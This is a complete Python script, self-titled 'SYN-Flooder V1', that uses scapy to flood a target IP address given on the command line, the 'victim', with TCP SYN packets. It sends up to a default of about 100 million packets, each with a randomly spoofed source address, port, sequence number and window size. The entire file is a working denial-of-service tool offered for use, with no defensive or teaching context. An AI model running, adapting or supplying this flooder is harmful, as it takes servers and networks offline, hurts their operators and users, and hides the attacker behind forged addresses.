import argparse
from scapy.all import *
import random

def random_IP():
	IP = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return IP

def Args():
    default_packets = 99999999
    parser = argparse.ArgumentParser(description="Welcome to SYN-Flooder V1\n")    #Get Arguments
    parser.add_argument('t',help="Victims IPv4-Adress")
    parser.add_argument('-a',type=int,help="Amount of packets (default are infinity)",default=default_packets)
    parser.add_argument('-p',type=int,help="Destination Port (default is 80)",default=80)
    args = parser.parse_args()
    return args.t,args.p,args.a

def SYN_Flood(Target_IP,dPort,packets_to_send):
    MAX_PORTS = 65535
    print("Sending packets...")
    counter = 0
    for i in range(packets_to_send):
        seq_n = random.randint(0,MAX_PORTS)
        sPort = random.randint(0,MAX_PORTS)
        Window = random.randint(0,MAX_PORTS)
        src_IP = random_IP()
        packet = IP(dst=Target_IP,src=src_IP)/TCP(sport=sPort,dport=dPort,flags="S",seq=seq_n,window=Window)
        send(packet,verbose=0)
        counter += 1
    print("Finished!")

def main():
    Target_IP,dPort,packets_to_send = Args()
    SYN_Flood(Target_IP,dPort,packets_to_send)

main()
